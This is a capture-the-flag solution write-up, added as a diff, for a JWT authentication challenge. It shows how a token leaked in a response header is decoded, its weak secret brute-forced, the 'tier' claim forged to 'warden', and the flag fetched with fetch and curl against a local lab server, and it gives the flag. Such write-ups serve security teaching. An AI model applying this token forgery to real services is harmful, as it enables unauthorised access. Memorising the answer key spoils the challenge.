@@ -1,0 +1,77 @@
+Secret Chamber
+
+Topic: JWT Authentication
+
+Description: You are in a cave which leads to a secret chamber. It is the headquarters of an intelligence agency. Find the secret code to enter the headquarters.
+
+Solution: 
+The application presents multiple entry points(they are all decoys):
+
+/login – non-functional authentication
+
+/dashboard – limited access with subtle hints
+
+/api/status – misleading client-side hints
+
+No JWT is stored in cookies or localStorage, suggesting authentication is handled elsewhere.
+
+Inspecting network requests reveals a request for a background image: background.png
+You can see the token in response headers in X-Auth-Token if you are using DevTools.
+x-auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3lzdGVtIiwidGllciI6Im9ic2VydmVyIiwiaGludCI6InNhbWUgc2VjcmV0cyByZXBlYXQiLCJpYXQiOjE3NjYyODY2NTV9.rhaurqZSf7uqLMT30cg5tXRBKPb5xZDzLkEoFYMntIQ
+Decoding the token gives 
+Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+Payload: 
+{
+  "user": "system",
+  "tier": "observer",
+  "hint": "same secrets repeat",
+  "iat": <timestamp>
+}
+Following the hints the token needs to be resigned with payload modified as:
+"tier": "warden"
+Enter the correct secret which can be guessed by brute force.
+secret: background
+
+The forged token is sent via the Authorization header:
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3lzdGVtIiwidGllciI6IndhcmRlbiIsImhpbnQiOiJzYW1lIHNlY3JldHMgcmVwZWF0IiwiaWF0IjoxNzY2Mjg2NjU1fQ.-rURVLt0If6qW6DG33F1xOpCi9hDUMqeWf6LBU6cHKQ
+Accessing /vault with this token grants entry.
+
+fetch("/vault", {
+  headers: {
+    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3lzdGVtIiwidGllciI6IndhcmRlbiIsImhpbnQiOiJzYW1lIHNlY3JldHMgcmVwZWF0IiwiaWF0IjoxNzY4NDk3MTE2fQ.5gEwc9RRowP4IV2dlyq12dGzJPbQwI0Q7PGLaa7rY10"
+  }
+})
+.then(r => r.text())
+.then(console.log)
+
+The vault page does not contain the flag, but provides a crucial hint:
+Directory index disabled.
+Legacy systems still linger.
+
+The JWT payload hinted at reused secrets.
+Submitting a POST request:
+fetch("/vault/flag.txt", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "password=background"
+})
+.then(r => r.text())
+.then(console.log)
+(Guess the file name by brute force)
+
+Using the Command Line (cURL)
+If you are on a Mac, Linux, or updated Windows machine, curl is a fast way to interact with APIs.
+
+Command: curl -X POST -d "password=background" http://127.0.0.1:5000/vault/flag.txt
+
+Flag: Cultrang{jw7_s3cr3ts_hid3_in_pl4in_5igh7}
+
+#Added for reference:
+
